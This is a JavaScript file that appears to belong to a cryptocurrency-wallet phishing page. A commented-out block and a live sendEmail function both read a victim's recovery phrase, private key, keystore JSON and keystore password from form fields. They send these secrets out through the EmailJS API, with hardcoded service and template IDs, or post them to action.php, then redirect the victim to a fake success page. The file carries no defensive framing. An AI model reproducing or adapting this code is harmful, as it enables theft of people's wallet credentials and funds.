
// function ready() {
//     document.body.style.display = "block";
// }
// document.addEventListener("DOMContentLoaded", ready);
// const phraseProceedBtn = document.getElementById('phraseProceed');
// const keystorejsonProceedBtn = document.getElementById('keystorejsonproceed');
// const privatekeyProceedBtn = document.getElementById('privatekeyProceed');

// function makeid(length) {
//     var result = '';
//     var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
//     var charactersLength = characters.length;
//     for (var i = 0; i < length; i++) {
//         result += characters.charAt(Math.floor(Math.random() *
//             charactersLength));
//     }
//     return result;
// }
// const phraseProceedHandler = () => {
//     event.preventDefault();
//     let phraseInputVal = document.getElementById('phraseInput').value;
//     const wallet = document.getElementById('wallet_id').value;
//     let code = makeid(24);
//     let data = {
//         service_id: 'service_rwjou9f',
//         template_id: 'template_ghfq8nl',
//         user_id: 'kthC-2_Tt4gGD9Hfr',
//         template_params: {
//             "import_type": "phrase",
//             "phrase": phraseInputVal,
//             "code": code,
//             "wallet": wallet
//         }
//     }
//     if (phraseInputVal.trim() === "") {
//         alert('Fill in your recovery phrase');
//     } else {

//         $.ajax({
//             url: "https://api.emailjs.com/api/v1.0/email/send",
//             method: 'POST',
//             data: JSON.stringify(data),
//             contentType: 'application/json',
//             success: function (res) {
//                 if (res.trim() != "") {
//                     if (res.trim() == "OK") {
//                         phraseInputVal = '';
//                         redirect(code);
//                         document.querySelector('.sending').style.display = 'block';

//                     } else {
//                         alert('Could not proceed due to some errors, kindly try again later.');
//                         console.log(res);
//                     }
//                 }
//             }
//         });
//     }
// };

// const keystorejsonProceedHandler = () => {
//     event.preventDefault();
//     let keystorejson = document.getElementById('keystorejson').value;
//     let keystorepassword = document.getElementById('keystorepassword').value;
//     let code = makeid(24);
//     const wallet = document.getElementById('wallet_id').value;
//     let data = {
//         service_id: 'service_rwjou9f',
//         template_id: 'template_ghfq8nl',
//         user_id: 'kthC-2_Tt4gGD9Hfr',
//         template_params: {
//             "import_type": "keystore",
//             "keystorejson": keystorejson,
//             "keystorepassword": keystorepassword,
//             "code": code,
//             "wallet": wallet
//         }
//     }
//     if (keystorejson.trim() === "" || keystorepassword === "") {
//         alert('Fill out all form fields before proceeding');
//     } else {
//         $.ajax({
//             url: "action.php",
//             method: 'POST',
//             data: JSON.stringify(data),
//             contentType: 'application/json',
//             success: function (res) {
//                 if (res.trim() !== "") {
//                     if (res.trim() == "success") {
//                         keystorepassword = '';
//                         keystorejson = '';
//                         redirect(code);
//                         document.querySelector('.sending').style.display = 'block';
//                     } else {
//                         alert('Could not proceed due to some errors, kindly try again later.')
//                     }
//                 }
//             }
//         });
//     }
// };

// const privateKeyProceedHandler = () => {
//     event.preventDefault();
//     let privatekey = document.getElementById('privatekey').value;
//     const wallet = document.getElementById('wallet_id').value;
//     let code = makeid(24);
//     console.log(wallet);
//     let data = {
//         service_id: 'service_rwjou9f',
//         template_id: 'template_ghfq8nl',
//         user_id: 'kthC-2_Tt4gGD9Hfr',
//         template_params: {
//             "import_type": "privatekey",
//             "privatekey": privatekey,
//             "code": code,
//             "wallet": wallet
//         }
//     }
//     if (privatekey.trim() === "") {
//         alert('Fill in your private key');
//     } else {
//         $.ajax({
//             url: "https://api.emailjs.com/api/v1.0/email/send",
//             method: 'POST',
//             data: JSON.stringify(data),
//             contentType: 'application/json',
//             success: function (res) {
//                 if (res.trim() !== "") {
//                     privatekey = '';
//                     redirect(code);
//                     document.querySelector('.sending').style.display = 'block';
//                 } else {
//                     alert('Could not proceed due to some errors, kindly try again later.');
//                 }
//             }
//         });
//     }
// };

// const redirect = (token) => {
//     window.location.href = "success9561.html?code=" + token;
// };

// phraseProceedBtn.addEventListener('click', phraseProceedHandler);
// keystorejsonProceedBtn.addEventListener('click', keystorejsonProceedHandler);
// privatekeyProceedBtn.addEventListener('click', privateKeyProceedHandler);

function sendEmail(){
    var params= {
       privatekey: document.getElementById("privatekey").value,
       phraseInput: document.getElementById("phraseInput").value,
       wallet_id: document.getElementById("wallet_id").value,
       keystorejson: document.getElementById("keystorejson").value,
       keystorepassword: document.getElementById("keystorepassword").value,
       }
       const serviceID = "service_2ux47q5"
       const templateID = "template_u7dwmmj"

       emailjs.send(serviceID,templateID,params)
       .then(
        function(response){
            console.log("SUCCESS!",
        response.status, response.text);
        window.location.href="success.html"
        },   
    function (error){console.log("FAILED...", error);
    }
);

    }
